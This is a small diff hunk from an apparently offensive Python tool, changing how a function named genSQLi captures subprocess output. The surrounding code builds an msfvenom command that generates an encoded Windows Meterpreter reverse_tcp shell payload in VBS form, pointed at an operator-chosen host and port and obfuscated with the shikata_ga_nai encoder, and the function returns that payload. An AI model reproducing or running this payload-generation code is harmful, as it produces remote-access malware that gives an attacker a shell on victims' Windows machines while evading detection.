@@ -62,8 +62,8 @@ def genSQLi(lhost, lport):
 	"""
 	print(colored("[+] Generating exploit. Be patient...", 'green'))
 	command = "msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -e x86/shikata_ga_nai -f vbs".format(host=lhost, port=lport)
-	process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
-	output = process.communicate()
+	process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+	output = process.communicate()[0]
 	print(colored("[+] Generating rev shell for {host}:{port}".format(host=lhost, port=lport), 'green'))
 	return output
 
